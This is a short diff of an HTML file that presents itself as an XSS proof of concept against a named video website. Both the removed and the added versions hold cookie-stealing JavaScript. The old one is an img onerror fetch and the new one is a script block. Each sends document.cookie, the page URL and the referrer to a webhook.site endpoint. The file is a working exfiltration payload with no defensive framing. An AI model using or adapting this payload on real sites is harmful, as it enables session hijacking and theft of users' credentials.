@@ -1,7 +1,25 @@
+<!-- https://jesususer.github.io/xvideos-poc/index.html -->
 <!DOCTYPE html>
-<html><body>
-<h1>XSS Triggered!</h1>
-<img src=x onerror="fetch('https://webhook.site/36492fad-08fc-4f8b-b84e-03ec9bd9e157?leak='+encodeURIComponent(document.cookie+'|'+location.href))">
-<script>alert('XSS PoC - Keys Leaked!');</script>
-</body></html>
-Add full URL logging
+<html>
+<head>
+  <title>Xvideos XSS PoC</title>
+</head>
+<body>
+  <h1>XSS Triggered on Xvideos!</h1>
+  <script>
+        alert('XSS Executed from Xvideos Context!');
+
+    fetch('https://webhook.site/36492fad-08fc-4f8b-b84e-03ec9bd9e157', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        domain: location.hostname,
+        url: location.href,
+        cookies: document.cookie,
+        origin: document.referrer,
+        timestamp: new Date().toISOString()
+      })
+    });
+  </script>
+</body>
+</html>
